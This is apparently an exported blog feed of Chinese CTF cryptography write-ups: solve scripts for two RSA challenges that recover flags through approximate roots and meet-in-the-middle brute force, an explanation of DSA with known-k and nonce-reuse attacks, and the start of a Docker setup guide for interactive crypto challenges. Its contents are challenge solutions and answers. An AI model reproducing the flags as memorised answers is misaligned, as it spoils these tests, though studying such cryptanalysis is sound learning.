class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取密文c</span></span><br><span class="line"><span class="attribute">with</span> open(&#x27;flag&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">    <span class="attribute">c</span> = libnum.s<span class="number">2</span>n(f.read())</span><br><span class="line"></span><br><span class="line"><span class="attribute">n</span> = <span class="number">15987576139341888788648863000534417640300610310400667285095951525208145689364599119023071414036901060746667790322978452082156680245315967027826237720608915093109552001033660867808508307569531484090109429319369422352192782126107818889717133951923616077943884651989622345435505428708807799081267551724239052569147921746342232280621533501263115148844736900422712305937266228809533549134349607212400851092005281865296850991469375578815615235030857047620950536534729591359236290249610371406300791107442098796128895918697534590865459421439398361818591924211607651747970679849262467894774012617335352887745475509155575074809</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e*q = kp+1</span></span><br><span class="line"><span class="comment"># n*e = p*q*e = p*(kp+1)</span></span><br><span class="line"><span class="comment"># k确实大不了</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> k in range(<span class="number">1</span>, <span class="number">9999999</span>):</span><br><span class="line">    <span class="attribute">print</span>(k)</span><br><span class="line">    <span class="attribute">p</span> = gmpy<span class="number">2</span>.iroot((n*e)//k, <span class="number">2</span>)</span><br><span class="line">    <span class="attribute">if</span> n % p[<span class="number">0</span>] == <span class="number">0</span>:  # 不需要也不能判断是否整除</span><br><span class="line">        <span class="attribute">p</span> = p[<span class="number">0</span>]</span><br><span class="line">        <span class="attribute">break</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">q</span> = n // p</span><br><span class="line"><span class="attribute">phi</span> = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="attribute">d</span> = int(gmpy<span class="number">2</span>.invert(e, phi))</span><br><span class="line"><span class="attribute">m</span> = int(pow(c, d,n))</span><br><span class="line"><span class="attribute">print</span>(libnum.n<span class="number">2</span>s(m))</span><br><span class="line"><span class="comment"># b&#x27;ACTF&#123;F1nD1nG_5pEcia1_n_i5_nOt_eA5y&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>不再用LaTex数学公式赘述一遍了，代码、解题思路很清晰</p><p>主要还是要归纳下解题思路</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这大抵是CTF赛事中Crypto里一种常见的手法</p><ul><li><p><strong>遍历较小的值，近似求解</strong></p><p>题做少了，这也能卡住🤕</p></li><li><p><strong>gmpy2.iroot()</strong></p><p>居然会给出近似结果</p></li></ul><h1 id="RSA-Leak"><a href="#RSA-Leak" class="headerlink" title="RSA Leak"></a>RSA Leak</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="comment"># 可求出p、q、phi、d</span></span><br><span class="line">    p = random_prime(<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">64</span>))</span><br><span class="line">    q = random_prime(<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">64</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    <span class="built_in">print</span>((<span class="built_in">pow</span>(a, e) + <span class="built_in">pow</span>(b, e) + <span class="number">0xdeadbeef</span>) % n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    a = randrange(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">256</span>))</span><br><span class="line">    b = randrange(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">256</span>))</span><br><span class="line">    p = <span class="built_in">pow</span>(a, <span class="number">4</span>)  <span class="comment"># a**4</span></span><br><span class="line">    q = <span class="built_in">pow</span>(b, <span class="number">4</span>)  <span class="comment"># b**4</span></span><br><span class="line">    rp = randrange(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">24</span>))</span><br><span class="line">    rq = randrange(<span class="number">0</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">24</span>))</span><br><span class="line">    pp = next_prime(p + rp)  <span class="comment"># p + rp + p_</span></span><br><span class="line">    qq = next_prime(q + rq)  <span class="comment"># q + rq + q_</span></span><br><span class="line">    <span class="keyword">if</span> pp % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">4</span>) == (pp - p) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">4</span>) <span class="keyword">and</span> qq % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">4</span>) == (qq - q) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">4</span>):  <span class="comment"># a、b是偶数</span></span><br><span class="line">        <span class="comment"># p % 16 = 0, a^4 mod 2^4 = 0, a = 2*k</span></span><br><span class="line">        n = pp * qq</span><br><span class="line">        rp = pp - p  <span class="comment"># 稍微放大了些</span></span><br><span class="line">        rq = qq - q</span><br><span class="line">        <span class="keyword">return</span> n, rp, rq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, rp, rq = gen_key()</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=======leak=======&quot;</span>)</span><br><span class="line">leak(rp, rq)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 3183573836769699313763043722513486503160533089470716348487649113450828830224151824106050562868640291712433283679799855890306945562430572137128269318944453041825476154913676849658599642113896525291798525533722805116041675462675732995881671359593602584751304602244415149859346875340361740775463623467503186824385780851920136368593725535779854726168687179051303851797111239451264183276544616736820298054063232641359775128753071340474714720534858295660426278356630743758247422916519687362426114443660989774519751234591819547129288719863041972824405872212208118093577184659446552017086531002340663509215501866212294702743</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 48433948078708266558408900822131846839473472350405274958254566291017137879542806238459456400958349315245447486509633749276746053786868315163583443030289607980449076267295483248068122553237802668045588106193692102901936355277693449867608379899254200590252441986645643511838233803828204450622023993363140246583650322952060860867801081687288233255776380790653361695125971596448862744165007007840033270102756536056501059098523990991260352123691349393725158028931174218091973919457078350257978338294099849690514328273829474324145569140386584429042884336459789499705672633475010234403132893629856284982320249119974872840</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=======leak=======</span></span><br><span class="line"><span class="string">n_ = 122146249659110799196678177080657779971</span></span><br><span class="line"><span class="string">tmp = 90846368443479079691227824315092288065</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><p>先聚焦一下，题目生成密钥的过程</p><ul><li><p>$a、b∈ [1, 2^{256}]$</p></li><li><p>$p = a^4; q = b^4$</p></li><li><p>$rp、rq∈ [1, 2^{24}]$</p></li><li><p>$pp = next\_prime(p + rp)$</p><p>$qq = next\_prime(q + rq)$</p></li><li><p>$n = pp * qq$</p></li><li><p>$rp = pp - p$</p><p>$rq = q - q$</p><p><strong>注意：</strong>这里的rp、rq都放大了，不过还是在$2^{24}$范围内</p></li></ul><p>然后leak函数泄漏的内容如下：</p><ul><li>$(Prime)p1、q1 ∈ [1, 2^{64}]$</li><li>$n1 = p1*q1$</li><li>tmp = <code>(pow(rp, e) + pow(rq, e) + 0xdeadbeef) % n1</code></li></ul><p>扎扎实实看了半天，啥也不会🤧</p><ul><li><p>直接用<code>small_roots()</code></p><p>报错，幂为65537的运算溢出了</p></li><li><p>直接在范围$2^{24}$内爆破</p><p>巨慢无比，不可能得到</p></li></ul><p>看题解后，学习之</p><p>先不管有没有用、怎么用，最好先看看如何从leak里获得rp、rq</p><p>遍历rp、rq速度太慢，看wp里用的是：<strong>遍历rp，用rp来表达rq，再校验rq的比特位</strong></p><p>学到！（还是有疑惑的，为什么满足比特位的只有这么一个值</p><ul><li><p>rp、rq爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n_ = <span class="number">122146249659110799196678177080657779971</span></span><br><span class="line">tmp = <span class="number">90846368443479079691227824315092288065</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">8949458376079230661</span></span><br><span class="line">q = <span class="number">13648451618657980711</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(invert(e, phi))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">24</span>)):</span><br><span class="line">    <span class="built_in">print</span>(rp)</span><br><span class="line">    rp_e = <span class="built_in">pow</span>(rp, e, n_)</span><br><span class="line">    <span class="comment"># print((pow(a, e) + pow(b, e) + 0xdeadbeef) % n)</span></span><br><span class="line">    rq_e = (tmp - rp_e - <span class="number">0xdeadbeef</span>) % n_</span><br><span class="line">    <span class="comment"># rq_e = gmpy2.iroot() 哒咩！用d</span></span><br><span class="line">    rq = <span class="built_in">int</span>(<span class="built_in">pow</span>(rq_e, d, n_))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(rq)[<span class="number">2</span>:]) &lt;= <span class="number">24</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;rp&#x27;</span>, rp)  <span class="comment"># 405771</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;rq&#x27;</span>, rq)  <span class="comment"># 11974933</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">pow</span>(rp, e) + <span class="built_in">pow</span>(rq, e) + <span class="number">0xdeadbeef</span>) % n_ == tmp:</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><p>or </p><p>中间相遇攻击</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">from</span> tqdm import tqdm</span><br><span class="line"></span><br><span class="line"><span class="attribute">n0</span> = <span class="number">122146249659110799196678177080657779971</span></span><br><span class="line"><span class="attribute">c</span> = (<span class="number">90846368443479079691227824315092288065</span>-<span class="number">0</span>xdeadbeef)%n<span class="number">0</span></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">dic</span> = &#123;&#125;</span><br><span class="line"><span class="attribute">for</span> i in tqdm(range(<span class="number">1</span>,<span class="number">2</span>**<span class="number">24</span>)):</span><br><span class="line">    <span class="attribute">tmp</span> =(c-pow(i,e,n<span class="number">0</span>))%n<span class="number">0</span></span><br><span class="line">    <span class="attribute">dic</span>[tmp]=i</span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> i in tqdm(range(<span class="number">2</span>**<span class="number">24</span>)):</span><br><span class="line">    <span class="attribute">t</span> = pow(i,e,n<span class="number">0</span>)</span><br><span class="line">    <span class="attribute">if</span> t in dic.keys():</span><br><span class="line">        <span class="attribute">print</span>(i,dic[t])</span><br></pre></td></tr></table></figure><hr><p>接下来，拿到rp、rq后，再观察n的构成</p><p>$pp = p+rp=a^4+rp$,  $qq = q+rq=b^4+rq$</p><p>$n = pp•qq = (p•q+rq•p+rp•q+rp•rq) = (ab)^4+rq•a^4+rp•b^4+rp•rq$</p><p><strong>由于a、b与rp、rq的巨大大小差距，对其开开四次方，可得到ab</strong></p><p>$\sqrt[4]{n} = ab$, 对之再四次方，即可得到$pq = (ab)^4$</p><p>于是$rq•a^4+rp•b^4 = rq•p+rp•q=n - (ab)^4 - rp•rq$</p><p>一个式子解二元方程，是难题，计算机最好解的是一元方程</p><p>于是我们转化成一元，方法是两边同时乘q（p也行）</p><p>$rq•p•q+rp•q^2 = rq•n+rp•q^2=(n - (ab)^4 - rp•rq)•q$</p><p>上式中只有一个未知量q，解出来后再代回来就得到p了</p><p>于是，$pp=p+rp,  qq=q+rq$, 此题结束</p><p>总代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n_ = <span class="number">122146249659110799196678177080657779971</span></span><br><span class="line">tmp = <span class="number">90846368443479079691227824315092288065</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">8949458376079230661</span></span><br><span class="line">q = <span class="number">13648451618657980711</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi1 = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d1 = <span class="built_in">int</span>(invert(e, phi1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rp <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">24</span>)):</span><br><span class="line">    <span class="built_in">print</span>(rp)</span><br><span class="line">    rp_e = <span class="built_in">pow</span>(rp, e, n_)</span><br><span class="line">    <span class="comment"># print((pow(a, e) + pow(b, e) + 0xdeadbeef) % n)</span></span><br><span class="line">    rq_e = (tmp - rp_e - <span class="number">0xdeadbeef</span>) % n_</span><br><span class="line">    <span class="comment"># rq_e = gmpy2.iroot() 哒咩！用d</span></span><br><span class="line">    rq = <span class="built_in">int</span>(<span class="built_in">pow</span>(rq_e, d1, n_))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(rq)[<span class="number">2</span>:]) &lt;= <span class="number">24</span>:</span><br><span class="line">        rp = <span class="built_in">int</span>(rp)</span><br><span class="line">        rq = <span class="built_in">int</span>(rq)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;rp =&#x27;</span>, rp)  <span class="comment"># 405771</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;rq =&#x27;</span>, rq)  <span class="comment"># 11974933</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">pow</span>(rp, e) + <span class="built_in">pow</span>(rq, e) + <span class="number">0xdeadbeef</span>) % n_ == tmp:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">3183573836769699313763043722513486503160533089470716348487649113450828830224151824106050562868640291712433283679799855890306945562430572137128269318944453041825476154913676849658599642113896525291798525533722805116041675462675732995881671359593602584751304602244415149859346875340361740775463623467503186824385780851920136368593725535779854726168687179051303851797111239451264183276544616736820298054063232641359775128753071340474714720534858295660426278356630743758247422916519687362426114443660989774519751234591819547129288719863041972824405872212208118093577184659446552017086531002340663509215501866212294702743</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">48433948078708266558408900822131846839473472350405274958254566291017137879542806238459456400958349315245447486509633749276746053786868315163583443030289607980449076267295483248068122553237802668045588106193692102901936355277693449867608379899254200590252441986645643511838233803828204450622023993363140246583650322952060860867801081687288233255776380790653361695125971596448862744165007007840033270102756536056501059098523990991260352123691349393725158028931174218091973919457078350257978338294099849690514328273829474324145569140386584429042884336459789499705672633475010234403132893629856284982320249119974872840</span></span><br><span class="line">pq = <span class="built_in">int</span>((iroot(n, <span class="number">4</span>)[<span class="number">0</span>])**<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">tmp1 = n-pq-rp*rq</span><br><span class="line">var(<span class="string">&#x27;q&#x27;</span>)  <span class="comment"># 申明变量</span></span><br><span class="line">q = <span class="built_in">int</span>(<span class="built_in">str</span>(solve([rq*pq+rp*(q**<span class="number">2</span>)==tmp1*q], [q])[<span class="number">0</span>]).split(<span class="string">&#x27;q ==&#x27;</span>)[-<span class="number">1</span>])  <span class="comment"># 求解</span></span><br><span class="line">p = (tmp1-rp*q)//rq</span><br><span class="line">pp = p+rp</span><br><span class="line">qq = q+rq</span><br><span class="line">phi = (pp-<span class="number">1</span>)*(qq-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(invert(e, phi))</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br><span class="line"><span class="comment"># ACTF&#123;lsb_attack_in_RSA|a32d7f&#125;</span></span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ul><li>手法1：遍历一变量，表达并验证另一变量</li><li>手法2：根据数据大小特性，开方近似求解</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DSA</title>
      <link href="/2022/07/04/DSA/"/>
      <url>/2022/07/04/DSA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>DSA（Digital Signature Algorithm）是Schnorr和ElGamal签名算法的变种，被美国NIST作为DSS(DigitalSignature Standard) 数字签名的标准。  </p><p>DSA是基于整数有限域离散对数难题的。</p></blockquote><blockquote><p>DSA是一种更高级的验证方式，它是一种公开密钥算法，不能用来加密数据，一般用于数字签名和认证。</p><p>发送者使用自己的私钥对文件或消息进行签名，接受者收到消息后使用发送者的公钥来验证签名的真实性，包括数据的完整性以及数据发送者的身份。如果数据和签名不匹配则认为验证失败！数字签名的作用就是校验数据在传输过程中不被修改。</p></blockquote><h2 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h2><h3 id="密钥生成"><a href="#密钥生成" class="headerlink" title="密钥生成"></a><strong>密钥生成</strong></h3><ol><li><p>选择合适的哈希函数（一般为SHA）<strong>H</strong></p></li><li><p>选择密钥长度<strong>L</strong>与<strong>N</strong></p><ul><li>L最好为64的倍数， $512≤L≤1024$</li><li>$N≤len(H)$</li></ul></li><li><p>选择<strong>N比特位</strong>的<strong>素数q</strong></p></li><li><p>选择<strong>L比特位</strong>的<strong>素数p</strong>且$q | p-1$</p></li><li><p>选择模p下阶为q的最小正整数<strong>g</strong>（$g^q≡1 \mod p$）</p><p>此时，$g≡h^{\frac{p-1}{q}} \mod p, h∈(1,p−1) $</p></li><li><p>选择私钥$x∈(0,q) $，计算$y≡g^x \mod p$</p></li><li><p>公钥: <strong>(p, q, g, y)</strong></p><p>私钥: <strong>x</strong></p></li></ol><h3 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h3><ol><li>选$k≡(0,q)作为临时密钥$</li><li>$r≡(g^k \mod p) \mod q$</li><li>$s≡(H(m)+xr)k^{-1} \mod q$</li><li>签名结果: <strong>(r, s)</strong></li></ol><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ol><li>记$\omega ≡ s^{-1} \mod q$</li><li>记$u_1≡H(m)*\omega \mod q$</li><li>记$u_2≡r*\omega \mod q$</li><li>$v≡(g^{u_1}*y^{u_2} \mod p) \mod q$</li><li>若<strong>v=r</strong>，验证成功</li></ol><h3 id="正确性证明"><a href="#正确性证明" class="headerlink" title="正确性证明"></a>正确性证明</h3><blockquote><p>我推了几次，不够完备，这里参考CTF-Wiki</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220701175606336.png" alt="证明"></p><p>同样的，由于对签名认知过少，这里也试着摸索下它的合理性，以及陷门何在。</p><ul><li><p>由DSA签名过程知，验证需要用到$\omega$也即$s^{-1} \mod q$,而$s$是含有私钥$x$的</p><p>简言之，验证需要正确的私钥$x$，$x$泄漏，身份就被窃取了</p></li><li><p>而不同于ElGamal签名，它（DSA数字签名）算了明文的哈希值</p><p>这就使得验证完身份正确后，还可以得到明文的哈希值，与所给出的比对，就实现了证明<strong>是这个人</strong>要传输<strong>这些信息</strong></p></li></ul><h3 id="相关攻击"><a href="#相关攻击" class="headerlink" title="相关攻击"></a>相关攻击</h3><h4 id="已知-k"><a href="#已知-k" class="headerlink" title="已知 k"></a>已知 k</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>首先，明确k是什么。</p><p>k是临时私钥，也是不可泄漏的！</p><p>否则，有：$x \equiv r^{-1}(ks-H(m)) \bmod q$      </p><p>（<strong>H(m)一般会给出</strong>）</p><p>得到了私钥x，验证可过。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>值得一提，按我的理解，实际场景就算得到了私钥，但就本次签名而言，H(m)已经固定</p><p>所以其意义在于，已知k可以通过本次签名得到x，方便后续签名过程伪造，但对于本次签名内容却不可篡改</p><h4 id="K复用（共享k）"><a href="#K复用（共享k）" class="headerlink" title="K复用（共享k）"></a>K复用（共享k）</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>在DSA签名时，一次生成的参数L、N、p、q、x、g、y都是可以重复使用的</p><p><strong>但临时私钥k不可以重复使用</strong></p><p>若k重复使用，有：</p><p>$s_1\equiv (H(m_1)+xr)k^{-1} \bmod q$</p><p>$s_2\equiv (H(m_2)+xr)k^{-1} \bmod q$</p><p><strong>已知参数：</strong></p><ul><li>s1、H(m1)、r、q</li><li>s2、H(m2)、r、q</li></ul><p><strong>未知参数：</strong></p><ul><li>$x$</li><li>$k^{-1}$</li></ul><p>则：</p><p>$s_1k \equiv H(m_1)+xr \mod q$</p><p>$s_2k \equiv H(m_2)+xr \mod q$</p><p>上下两式相减，得：</p><p>$k(s_1-s_2) \equiv H(m_1)-H(m_2) \bmod q$</p><h5 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h5><p>k复用（r相同）能将k求出，退化为k已知的问题</p><p>于是可求出私钥x，进而通过验证</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/">https://lazzzaro.github.io/2020/05/13/crypto-其他加密算法/</a></p></li><li><p><a href="https://poppywan.readthedocs.io/en/latest/002-security/028-dsa/">https://poppywan.readthedocs.io/en/latest/002-security/028-dsa/</a></p></li><li><p><a href="https://zhuanlan.zhihu.com/p/347025157">https://zhuanlan.zhihu.com/p/347025157</a></p></li><li><p><a href="https://ctf-wiki.org/crypto/signature/dsa/">https://ctf-wiki.org/crypto/signature/dsa/</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码出题指北</title>
      <link href="/2022/06/04/%E5%AF%86%E7%A0%81%E5%87%BA%E9%A2%98%E6%8C%87%E5%8C%97/"/>
      <url>/2022/06/04/%E5%AF%86%E7%A0%81%E5%87%BA%E9%A2%98%E6%8C%87%E5%8C%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="密码出题指北"><a href="#密码出题指北" class="headerlink" title="密码出题指北"></a>密码出题指北</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>换届了，🐬学长退休了😭😭😭</p><p>时间过的真快，数个月前（总之不到一年），21级的我们还是以新生的姿态蛰伏在实验室</p><p>👀眨眼间，就该变成实验室CTF主力了</p><p>想来，得给将至未至的新生出些许密码题目</p><p>但只是静态的py脚本，可真让人觉得枯燥🤔</p><p>遂于六月一日晚十一时，尝试琢磨学习，密码如何出<strong>交互式的题目</strong></p><p>希望能对以后将成主力的学弟学妹们，有一些帮助</p><h2 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h2><ul><li><a href="https://blog.soreatu.com/posts/how-to-setup-for-interactive-crypto-problems/">https://blog.soreatu.com/posts/how-to-setup-for-interactive-crypto-problems/</a></li><li><a href="https://4xwi11.github.io/posts/921543e1/#more">https://4xwi11.github.io/posts/921543e1/#more</a></li></ul><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220601233310224.png" alt="M1 MacBook Pro"></p><h3 id="Docker-for-mac"><a href="#Docker-for-mac" class="headerlink" title="Docker for mac"></a>Docker for mac</h3><ul><li><a href="https://blog.csdn.net/lxh_worldpeace/article/details/105454114?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165409563716782391831587%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165409563716782391831587&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-105454114-null-null.142^v11^control,157^v12^new_style&utm_term=mac+docker&spm=1018.2226.3001.4187">Mac系统docker安装配置及基本使用</a></li></ul><p>（或许win才是主流，说到底配起来也大同小异。而win可以参考的可太多了，不差这一篇）</p><p>跟着👆链接走</p><ol><li><p>安装<a href="https://hub.docker.com/editions/community/docker-ce-desktop-mac/">Docker</a></p></li><li><p>换<a href="https://cr.console.aliyun.com/undefined/instances/mirrors">阿里源</a>，需要注册账号先（这一步可忽略）</p><p>（<a href="https://tdll0jog.mirror.aliyuncs.com）">https://tdll0jog.mirror.aliyuncs.com）</a></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220601231956011.png" alt="step1"></p><p><img src="https://cdn.jsdelivr.net/gh/Harry0597/Imag@master/uPic/image-20220601232027015.png" alt="step2"></p></li><li><p>注册<a 